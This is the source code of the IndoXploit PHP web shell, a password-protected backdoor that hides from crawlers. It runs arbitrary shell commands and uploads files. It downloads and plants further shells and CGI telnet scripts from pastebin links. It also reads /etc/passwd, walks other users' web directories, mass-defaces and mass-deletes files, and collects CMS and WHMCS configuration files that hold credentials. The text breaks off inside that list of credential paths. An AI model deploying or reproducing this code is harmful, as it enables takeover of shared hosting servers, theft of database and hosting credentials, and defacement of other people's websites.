<?php
session_start();
@error_reporting(0);
@set_time_limit(0);

if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}

@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$password = "7b4939a8af28c814f0c757bb10f40d3d"; # md5: indoxploit

$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!DOCTYPE HTML>
<html>
<head>
<title>IndoXploit</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: transparent;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>
 ___________________________
< root@indoxploit:~# w00t??? >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====>
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
	</pre>
</header>
<form method="post">
<input type="password" name="password">
</form>
<?php
exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();

if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
?>
<!DOCTYPE HTML>
<html>
<!--
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & All My Friends.
###############################################################################
// Special Thanks: Depok Cyber Security | Sanjungan Jiwa | 0x1999
###############################################################################
-->
<head>
<title>IndoXploit</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
	color: #ffffff;
	font-size: 14px;
	width: 100%;
}

li {
	display: inline;
	margin: 5px;
	padding: 5px;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: gold;
	text-decoration: underline;
}

b {
	color: gold;
}

pre {
	font-size: 13px;
}

table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}

.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}

.th_home {
	color: lime;
}

.td_home, .td_home > a {
	color: #ffffff;
}

.td_home > a:hover {
	color: gold;
}

th {
	padding: 10px;
}

tr:hover {
	background: #006400;
	color: #ffffff;
}

input[type=text], input[type=password], .input {
	background: transparent; 
	color: #ffffff;
	border: 1px solid #ffffff;
	padding: 3px;
	font-family: 'Ubuntu';
	font-size: 13px;
}

input[type=submit] {
	padding: 2px;}

input[type=submit]:hover {
	cursor: pointer;
}

input:focus, textarea:focus {
  outline: 0;
  border-color: #ffffff;
}

textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
iframe {
	width: 100%;
	min-height: 500px;
}
</style>
</head>
<body>
<?php
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}

function getfile($name) {
	if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't spawn $name."));
	if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
	elseif($name === "webconsole") $get = array("https://pastebin.com/raw/2i96fDCN", "webconsole.php");
	elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx");
	elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx");
	elseif($name === "LRE") $get = array("https://pastebin.com/raw/PVPfA21i", "makman.php");

	$fp = fopen($get[1], "w");
	$ch = curl_init();
	 	  curl_setopt($ch, CURLOPT_URL, $get[0]);
	 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	   	  curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	   	  curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}

function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}

function getdomainname() {
	$fopen = fopen("/etc/named.conf", "r");
	while($read = fgets($fopen)) {
		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
		$domain[] = $getdomain[1][0];
	}
	return $domain;
}

function hddsize($size) {
	if($size >= 1073741824)
		return sprintf('%1.2f',$size / 1073741824 ).' GB';
	elseif($size >= 1048576)
		return sprintf('%1.2f',$size / 1048576 ) .' MB';
	elseif($size >= 1024)
		return sprintf('%1.2f',$size / 1024 ) .' KB';
	else
		return $size .' B';
}

function hdd() {
	$hdd['size'] = hddsize(disk_total_space("/"));
	$hdd['free'] = hddsize(disk_free_space("/"));
	$hdd['used'] = $hdd['size'] - $hdd['free'];
	return (object) $hdd;
}

function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function lib_installed() {
	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	return implode(" | ", $lib);
}

function pwd() {
	$dir = explode("/", path());
	foreach($dir as $key => $index) {
		print "<a href='?dir=";
		for($i = 0; $i <= $key; $i++) {
			print $dir[$i];
			if($i != $key) {
			print "/";
			}
		}
		print "'>$index</a>/";
	}
	print "<br>";
	print (OS() === "Windows") ? windisk() : "";
}

function windisk() {
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	$bool = $isdiskette = in_array($letter, array("A"));
	  	if(!$bool) $bool = is_dir("$letter:\\");
	  	if($bool) {
	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
	   		if($letter.":" != $v) {
	   			$letters .= $letter;
	   		}
	   		else {
	   			$letters .= color(1, 2, $letter);
	   		}
	   		$letters .= "</a> ]";
	  	}
	}
	if(!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(path(). "..");
	  		if(empty($v)) {
	  			$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
	  		}
	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
		}
	}
}

function serverinfo() {
	$disable_functions = @ini_get('disable_functions');
	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");

	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
	$output[] = "DISABLE FUNC: $disable_functions";
	$output[] = lib_installed();
	$output[] = "Current Dir (".writeable(path(), perms(path())).") ";

	print "<pre>";
	print implode("<br>", $output);
	pwd();
	print "</pre>";

}

function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
    	  curl_setopt($ch, CURLOPT_POST, true);
    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    return curl_exec($ch);
		  curl_close($ch);
}

function reverse() {
	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=");
	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
	$explode  = explode(",,", $response);
	unset($explode[0]);

	foreach($explode as $domain) {
		$domain = "http://$domain";
		$domain = str_replace(",", "", $domain);
		$url[] 	= $domain;
		ob_flush();
		flush();
	}

	return $url;
}

function getValue($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start 	= strpos($param, $kata1) + strlen($kata1);
    $end 	= strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

function massdeface($dir, $file, $filename, $type = null) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === "." || $dir_ === "..") {
			file_put_contents($location, $file);
		}
		else {
			if(is_dir($path) AND is_writable($path)) {
				print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
				file_put_contents($location, $file);
				if($type === "-alldir") {
					massdeface($path, $file, $filename, "-alldir");
				}
			}
		}
	}
}

function massdelete($dir, $filename) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === '.') {
			if(file_exists("$dir/$filename")) {
				unlink("$dir/$filename");
			}
		} 
		elseif($dir_ === '..') {
			if(file_exists(dirname($dir)."/$filename")) {
				unlink(dirname($dir)."/$filename");
			}
		} 
		else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($location)) {
					print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
					unlink($location);
					massdelete($path, $filename);
				}
			}
		}
	}
}

function tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
			  </form>";
	}
	elseif($toolsname === "readfile") {
		if(empty($args)) die(color(1, 1, $msg));
		if(!is_file($args)) die(color(1, 1, "File '$args' is not exists."));

		print "<pre>";
		print htmlspecialchars(file_get_contents($args));
		print "</pre>";
	}
	elseif($toolsname === "spawn") {
		if($args === "adminer") {
			if(file_exists("adminer.php")) {
				print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Adminer'."));
				if(getfile("adminer")) {
					print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
				}
				else {
					print color(1, 1, "Error while downloading file Adminer.");
					@unlink("adminer.php");
				}
			}
		}
		elseif($args === "webconsole") {
			if(file_exists("webconsole.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'WebConsole'."));
				if(getfile("webconsole")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file WebConsole.");
					@unlink("webconsole.php");
				}
			}
		}
		elseif($args === "cgitelnet1") {
			if(file_exists("idx_cgi/cgitelnet1.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet1.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
					@mkdir('idx_cgi', 0755);
					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet1")) {
					chmod('idx_cgi/cgitelnet1.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
	
		}
		elseif($args === "cgitelnet2") {
			if(file_exists("idx_cgi/cgitelnet2.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet2.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
					@mkdir('idx_cgi', 0755);
					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet2")) {
					chmod('idx_cgi/cgitelnet2.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
	
		}
		elseif($args === "phpinfo") {
			if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'phpinfo'."));
				save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #000000;}</style><div style=\'background: #000000; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
		}
	}
	elseif($toolsname === "upload") {
		if($_POST['upload']) {
			if($_POST['uploadtype'] === '1') {
				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			} 
			elseif($_POST['uploadtype'] === '2') {
				$root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
					if(@copy($_FILES['file']['tmp_name'], $root)) {
						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
					} 
					else {
						$act = color(1, 1, "Failed to upload file!");
					}
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			}
		}
		print "Upload File: $act
			  <form method='post' enctype='multipart/form-data'>
			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br>
			  <input type='file' name='file'>
			  <input type='submit' value='upload' name='upload'>
			  </form>";
	}
	elseif($toolsname === "jumping") {
		$i = 0;
		foreach(getuser() as $user) {
			$path = "/home/$user/public_html";
			if(is_readable($path)) {
				$status = color(1, 2, "[R]");
				if(is_writable($path)) {
					$status = color(1, 2, "[RW]");
				}
				$i++;
				print "$status <a href='?dir=$path'>".color(1, 4, $path)."</a>";
				if(!function_exists('posix_getpwuid')) print "<br>";
				if(!getdomainname()) print " => ".color(1, 1, "Can't get domain name")."<br>";
				foreach(getdomainname() as $domain) {
					$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
					$userdomain = $userdomain->name;
					if($userdomain === $user) {
						print " => <a href='http://$domain/' target='_blank'>".color(1, 2, $domain)."</a><br>";
						break;
					}
				}
			}
		}
		print ($i === 0) ? "" : "<p>".color(1, 3, "Total ada $i kamar di ".$GLOBALS['SERVERIP'])."</p>";
	}
	elseif($toolsname === "idxconfig") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
		if(!is_dir(path()."/idx_config/")) {
			@mkdir('idx_config', 0755);
			$htaccess = "Options all\nDirectoryIndex indoxploit.htm\nSatisfy Any";
			save("idx_config/.htaccess","w", $htaccess);

			foreach(getuser() as $user) {
				$user_docroot = "/home/$user/public_html/";
				if(is_readable($user_docroot)) {
					$getconfig = array(
						"/home/$user/.accesshash" => "WHM-accesshash",
						"$user_docroot/config/koneksi.php" => "Lokomedia",
						"$user_docroot/forum/config.php" => "phpBB",
						"$user_docroot/sites/default/settings.php" => "Drupal",
						"$user_docroot/config/settings.inc.php" => "PrestaShop",
						"$user_docroot/app/etc/local.xml" => "Magento",
						"$user_docroot/admin/config.php" => "OpenCart",
						"$user_docroot/application/config/database.php" => "Ellislab",
						"$user_docroot/vb/includes/config.php" => "Vbulletin",
						"$user_docroot/includes/config.php" => "Vbulletin",
						"$user_docroot/forum/includes/config.php" => "Vbulletin",
						"$user_docroot/forums/includes/config.php" => "Vbulletin",
						"$user_docroot/cc/includes/config.php" => "Vbulletin",
						"$user_docroot/inc/config.php" => "MyBB",
						"$user_docroot/includes/configure.php" => "OsCommerce",
						"$user_docroot/shop/includes/configure.php" => "OsCommerce",
						"$user_docroot/os/includes/configure.php" => "OsCommerce",
						"$user_docroot/oscom/includes/configure.php" => "OsCommerce",
						"$user_docroot/products/includes/configure.php" => "OsCommerce",
						"$user_docroot/cart/includes/configure.php" => "OsCommerce",
						"$user_docroot/inc/conf_global.php" => "IPB",
						"$user_docroot/wp-config.php" => "Wordpress",
						"$user_docroot/wp/test/wp-config.php" => "Wordpress",
						"$user_docroot/blog/wp-config.php" => "Wordpress",
						"$user_docroot/beta/wp-config.php" => "Wordpress",
						"$user_docroot/portal/wp-config.php" => "Wordpress",
						"$user_docroot/site/wp-config.php" => "Wordpress",
						"$user_docroot/wp/wp-config.php" => "Wordpress",
						"$user_docroot/WP/wp-config.php" => "Wordpress",
						"$user_docroot/news/wp-config.php" => "Wordpress",
						"$user_docroot/wordpress/wp-config.php" => "Wordpress",
						"$user_docroot/test/wp-config.php" => "Wordpress",
						"$user_docroot/demo/wp-config.php" => "Wordpress",
						"$user_docroot/home/wp-config.php" => "Wordpress",
						"$user_docroot/v1/wp-config.php" => "Wordpress",
						"$user_docroot/v2/wp-config.php" => "Wordpress",
						"$user_docroot/press/wp-config.php" => "Wordpress",
						"$user_docroot/new/wp-config.php" => "Wordpress",
						"$user_docroot/blogs/wp-config.php" => "Wordpress",
						"$user_docroot/configuration.php" => "Joomla",
						"$user_docroot/blog/configuration.php" => "Joomla",
						"$user_docroot/submitticket.php" => "^WHMCS",
						"$user_docroot/cms/configuration.php" => "Joomla",
						"$user_docroot/beta/configuration.php" => "Joomla",
						"$user_docroot/portal/configuration.php" => "Joomla",
						"$user_docroot/site/configuration.php" => "Joomla",
						"$user_docroot/main/configuration.php" => "Joomla",
						"$user_docroot/home/configuration.php" => "Joomla",
						"$user_docroot/demo/configuration.php" => "Joomla",
						"$user_docroot/test/configuration.php" => "Joomla",
						"$user_docroot/v1/configuration.php" => "Joomla",
						"$user_docroot/v2/configuration.php" => "Joomla",
						"$user_docroot/joomla/configuration.php" => "Joomla",
						"$user_docroot/new/configuration.php" => "Joomla",
						"$user_docroot/WHMCS/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs1/submitticket.php" => "WHMCS",
						"$user_docroot/Whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/whmcs/submitticket.php" => "WHMCS",
						"$user_docroot/WHMC/submitticket.php" => "WHMCS",
						"$user_docroot/Whmc/submitticket.php" => "WHMCS",
						"$user_docroot/whmc/submitticket.php" => "WHMCS",
						"$user_docroot/WHM/submitticket.php" => "WHMCS",
						"$user_docroot/Whm/submitticket.php" => "WHMCS",
						"$user_docroot/whm/submitticket.php" => "WHMCS",
						"$user_docroot/HOST/submitticket.php" => "WHMCS",
						"$user_docroot/Host/submitticket.php" => "WHMCS",
						"$user_docroot/host/submitticket.php" => "WHMCS",
						"$user_docroot/SUPPORTES/submitticket.php" => "WHMCS",
						"$user_docroot/Supportes/submitticket.php" => "WHMCS",
						"$user_docroot/supportes/submitticket.php" => "WHMCS",
						"$user_docroot/domains/submitticket.php" => "WHMCS",
						"$user_docroot/domain/submitticket.php" => "WHMCS",
						"$user_docroot/Hosting/submitticket.php" => "WHMCS",
						"$user_docroot/HOSTING/submitticket.php" => "WHMCS",
						"$user_docroot/hosting/submitticket.php" => "WHMCS",
						"$user_docroot/CART/submitticket.php" => "WHMCS",
						"$user_docroot/Cart/submitticket.php" => "WHMCS",
						"$user_docroot/cart/submitticket.php" => "WHMCS",
						"$user_docroot/ORDER/submitticket.php" => "WHMCS",
						"$user_docroot/Order/submitticket.php" => "WHMCS",
						"$user_docroot/order/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENT/submitticket.php" => "WHMCS",
						"$user_docroot/Client/submitticket.php" => "WHMCS",
						"$user_docroot/client/submitticket.php" => "WHMCS",
						"$user_docroot/CLIENTAREA/submitticket.php" => "WHMCS",
						"$user_docroot/Clientarea/submitticket.php" => "WHMCS",
						"$user_docroot/clientarea/submitticket.php" => "WHMCS",
						"$user_docroot/SUPPORT/submitticket.php" => "WHMCS",
						"$user_docroot/Support/submitticket.php" => "WHMCS",
						"$user_docroot/support/submitticket.php" => "WHMCS",
						"$user_docroot/BILLING/submitticket.php" => "WHMCS",
						"$user_docroot/Billing/submitticket.php" => "WHMCS",
						"$user_docroot/billing/submitticket.php" => "WHMCS",
						"$user_docroot/BUY/submitticket.php" => "WHMCS",
						"$user_docroot/Buy/submitticket.php" => "WHMCS",
